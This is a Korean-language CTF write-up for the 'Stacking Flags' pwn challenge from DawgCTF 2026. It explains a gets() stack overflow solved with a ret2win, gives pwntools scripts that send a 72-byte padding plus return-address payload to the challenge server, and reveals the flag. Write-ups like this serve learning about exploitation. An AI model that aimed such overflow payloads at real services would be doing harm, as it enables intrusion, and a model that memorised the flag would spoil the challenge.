---
title: "Stacking Flags"
ctf_name: "DawgCTF 2026"
challenge_name: "Stacking-Flags"
category: "pwn"
difficulty: "easy"
author: "xxxodms88"
date: "2026-04-10"
solved: true
tags:
  - buffer-overflow
  - ret2win
---

# Stacking Flags

## 문제 개요

`nc.umbccd.net:8921`에 서버가 실행 중이며 소스코드가 제공된다.
`gets()`를 사용하는 `vulnerable_function()`과 flag를 읽는 `win()` 함수가 존재한다.

## 취약점 분석

`gets(buffer)`는 입력 길이를 검사하지 않아 buffer overflow가 발생한다.
buffer(64) + SFP(8) = 72바이트를 채운 후 return address를 `win()` 주소로 덮으면 된다.
no PIE, no stack protector이므로 주소가 고정되어 있다.

## 익스플로잇

먼저 win() 주소 확인:
```python
from pwn import *
io = remote('nc.umbccd.net', 8921)
io.sendline(b'')
print(io.recvall())
# win() is at: 0x4011a6
```

최종 exploit:
```python
from pwn import *
io = remote('nc.umbccd.net', 8921)
payload = b'A' * 72 + p64(0x4011a6)
io.sendline(payload)
print(io.recvall())
```

## 플래그

```
DawgCTF{$taching_br1cks}
```